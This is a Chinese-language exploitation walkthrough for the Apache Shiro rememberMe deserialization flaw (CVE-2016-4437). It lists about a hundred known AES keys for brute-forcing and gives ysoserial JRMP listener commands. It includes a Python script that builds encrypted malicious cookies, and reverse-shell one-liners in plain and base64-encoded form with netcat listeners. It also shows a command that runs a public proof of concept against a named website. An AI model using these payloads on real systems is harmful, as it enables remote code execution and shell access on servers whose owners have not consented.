---
title: shiro
---

## CVE-2016-4437）Apache Shiro <= v1.2.4 反序列化漏洞
一、漏洞简介
Apache shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值-->Base64解码-->AES解密-->反序列化。
然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。
## 二、漏洞影响
Apache Shiro <= v1.2.4

三、复现过程
## 收集到的key
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
0AvVhmFLUs0KTA3Kprsdag==
1AvVhdsgUs0FSA3SDFAdag==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0FSA3SDFAdag==
3AvVhmFLUs0KTA3Kprsdag==
3JvYhmBLUs0ETA5Kprsdag==
r0e3c16IdVkouZgk1TKVMg==
5aaC5qKm5oqA5pyvAAAAAA==
5AvVhmFLUs0KTA3Kprsdag==
6AvVhmFLUs0KTA3Kprsdag==
6NfXkC7YVCV5DASIrEm1Rg==
6ZmI6I2j5Y+R5aSn5ZOlAA==
cmVtZW1iZXJNZQAAAAAAAA==
7AvVhmFLUs0KTA3Kprsdag==
8AvVhmFLUs0KTA3Kprsdag==
8BvVhmFLUs0KTA3Kprsdag==
9AvVhmFLUs0KTA3Kprsdag==
OUHYQzxQ/W9e/UjiAGu6rg==
a3dvbmcAAAAAAAAAAAAAAA==
aU1pcmFjbGVpTWlyYWNsZQ==
bWljcm9zAAAAAAAAAAAAAA==
bWluZS1hc3NldC1rZXk6QQ==
bXRvbnMAAAAAAAAAAAAAAA==
ZUdsaGJuSmxibVI2ZHc9PQ==
wGiHplamyXlVB11UXWol8g==
U3ByaW5nQmxhZGUAAAAAAA==
MTIzNDU2Nzg5MGFiY2RlZg==
L7RioUULEFhRyxM7a2R/Yg==
a2VlcE9uR29pbmdBbmRGaQ==
WcfHGU25gNnTxTlmJMeSpw==
OY//C4rhfwNxCQAQCrQQ1Q==
5J7bIJIV0LQSN3c9LPitBQ==
f/SY5TIve5WWzT4aQlABJA==
bya2HkYo57u6fWh5theAWw==
WuB+y2gcHRnY2Lg9+Aqmqg==
kPv59vyqzj00x11LXJZTjJ2UHW48jzHN
3qDVdLawoIr1xFd6ietnwg==
ZWvohmPdUsAWT3=KpPqda
YI1+nBV//m7ELrIyDHm6DQ==
6Zm+6I2j5Y+R5aS+5ZOlAA==
2A2V+RFLUs+eTA3Kpr+dag==
6ZmI6I2j3Y+R1aSn5BOlAA==
SkZpbmFsQmxhZGUAAAAAAA==
2cVtiE83c4lIrELJwKGJUw==
fsHspZw/92PrS3XrPW+vxw==
XTx6CKLo/SdSgub+OPHSrw==
sHdIjUN6tzhl8xZMG3ULCQ==
O4pdf+7e+mZe8NyxMTPJmQ==
HWrBltGvEZc14h9VpMvZWw==
rPNqM6uKFCyaL10AK51UkQ==
Y1JxNSPXVwMkyvES/kJGeQ==
lT2UvDUmQwewm6mMoiw4Ig==
MPdCMZ9urzEA50JDlDYYDg==
xVmmoltfpb8tTceuT5R7Bw==
c+3hFGPjbgzGdrC+MHgoRQ==
ClLk69oNcA3m+s0jIMIkpg==
Bf7MfkNR0axGGptozrebag==
1tC/xrDYs8ey+sa3emtiYw==
ZmFsYWRvLnh5ei5zaGlybw==
cGhyYWNrY3RmREUhfiMkZA==
IduElDUpDDXE677ZkhhKnQ==
yeAAo1E8BOeAYfBlm4NG9Q==
cGljYXMAAAAAAAAAAAAAAA==
2itfW92XazYRi5ltW0M2yA==
XgGkgqGqYrix9lI6vxcrRw==
ertVhmFLUs0KTA3Kprsdag==
5AvVhmFLUS0ATA4Kprsdag==
s0KTA3mFLUprK4AvVhsdag==
hBlzKg78ajaZuTE0VLzDDg==
9FvVhtFLUs0KnA3Kprsdyg==
d2ViUmVtZW1iZXJNZUtleQ==
yNeUgSzL/CfiWw1GALg6Ag==
NGk/3cQ6F5/UNPRh8LpMIg==
4BvVhmFLUs0KTA3Kprsdag==
MzVeSkYyWTI2OFVLZjRzZg==
CrownKey==a12d/dakdad
empodDEyMwAAAAAAAAAAAA==
A7UzJgh1+EWj5oBFi+mSgw==
YTM0NZomIzI2OTsmIzM0NTueYQ==
c2hpcm9fYmF0aXMzMgAAAA==
i45FVt72K2kLgvFrJtoZRw==
U3BAbW5nQmxhZGUAAAAAAA==
ZnJlc2h6Y24xMjM0NTY3OA==
Jt3C93kMR9D5e8QzwfsiMw==
MTIzNDU2NzgxMjM0NTY3OA==
vXP33AonIp9bFwGl7aT7rA==
V2hhdCBUaGUgSGVsbAAAAA==
Z3h6eWd4enklMjElMjElMjE=
Q01TX0JGTFlLRVlfMjAxOQ==
ZAvph3dsQs0FSL3SDFAdag==
Is9zJ3pzNh2cgTHB4ua3+Q==
NsZXjXVklWPZwOfkvk6kUA==
GAevYnznvgNCURavBhCr1w==
66v1O8keKNV3TTcGPK1wzg==
SDKOLKn2J1j/2BHjeZwAoQ==
## bash 转码地址
http://www.jackson-t.ca/runtime-exec-payloads.html
## bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
## ![image.png](/assets/pages_shiro_1614145050794_0.png)
## 姿势一
在vps上开启rmi注册表服务|
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'
## ![image.png](/assets/pages_shiro_1614145077881_0.png)
## 生成payload
python exploit.py vps:1099
## ![image.png](/assets/pages_shiro_1614145089851_0.png){:height 150, :width 626}
## exploit.py
```python
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())
```
nc监听
nc -lvvp 8888
使用burp发送生成好的payload
## ![image.png](/assets/pages_shiro_1614145153048_0.png)
## ![image.png](/assets/pages_shiro_1614145163486_0.png)
## poc
https://github.com/ianxtianxt/ShiroScan
## 首先我们在服务器中进行监听

nc -lvvp 1234
执行poc进行反弹shell
## python3 shiro.py https://www.0-sec.org "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}"
## ![image.png](/assets/pages_shiro_1614144876802_0.png)
## ![image.png](/assets/pages_shiro_1614144883758_0.png)